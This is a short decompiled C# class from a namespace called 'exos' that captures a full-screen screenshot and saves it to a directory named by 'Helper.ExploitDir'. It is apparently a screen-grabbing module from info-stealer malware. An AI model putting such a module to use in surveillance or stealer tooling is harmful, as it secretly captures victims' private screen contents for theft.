using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace exos;

internal class Screen
{
	public static void GetScreen()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		string exploitDir = Helper.ExploitDir;
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		Bitmap val = new Bitmap(width, height);
		Graphics.FromImage((Image)(object)val).CopyFromScreen(0, 0, 0, 0, ((Image)val).Size);
		((Image)val).Save(exploitDir + "\\Screenshot.png", ImageFormat.Png);
	}
}
